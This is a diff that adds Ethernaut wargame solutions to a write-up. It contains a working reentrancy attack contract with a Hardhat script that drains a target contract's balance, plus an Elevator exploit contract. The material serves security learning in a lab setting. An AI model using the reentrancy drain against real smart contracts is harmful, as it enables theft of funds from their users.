@@ -70,7 +70,7 @@ Create a Hardhat project
 ```sh
 mkdir 03-coin-flip
 cd 03-coin-flip
-npm init
+npm init -y
 npm install -D hardhat
 npx hardhat # Create a JavaScript project
 ```
@@ -270,6 +270,105 @@ async function main() {
   console.log(`Contract address: ${await contract.getAddress()}`);
   // One wei more than `await contract.prize()` from the Ethernaut Javascript console
   (await contract.attack({value: 1000000000000001})).wait();
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 10 Re-entrancy
+
+```sol
+pragma solidity ^0.8.0;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract ReentranceAttack {
+    IReentrance target;
+    
+    constructor(address _target) payable {
+        target = IReentrance(_target);
+    }
+
+    function attack() external payable {
+        target.donate{value: msg.value}(address(this));
+        target.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (address(target).balance >= msg.value) {
+            target.withdraw(msg.value);
+        }
+    }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = "<target contract address>";
+  const balance = await hre.ethers.provider.getBalance(target);
+  console.log(`Target balance = ${balance}`);
+  const amount = balance / 10n;
+
+  const contract = await hre.ethers.deployContract("ReentranceAttack", [target]);
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+  (await contract.attack({value: amount})).wait();
+  console.log("Attack complete");
+
+  console.log(`Target balance = ${await hre.ethers.provider.getBalance(target)}`);
+  console.log(`Contract balance = ${await hre.ethers.provider.getBalance(await contract.getAddress())}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 11 Elevator
+
+```sol
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint _floor) external;
+}
+
+contract ElevatorAttack {
+    uint calls;
+
+    function isLastFloor(uint) external returns (bool) {
+        calls++;
+        return calls % 2 == 0;
+    }
+
+    function attack(address target) external {
+        IElevator(target).goTo(1);
+    }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("Elevator")).attach("<target contract address>");
+  console.log(`Target top = ${await target.top()}`);
+
+  const contract = await hre.ethers.deployContract("ElevatorAttack");
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+  (await contract.attack(await target.getAddress())).wait();
+  console.log('Attack complete');
+  console.log(`Target top = ${await target.top()}`);
 }
 
 main().catch((error) => {
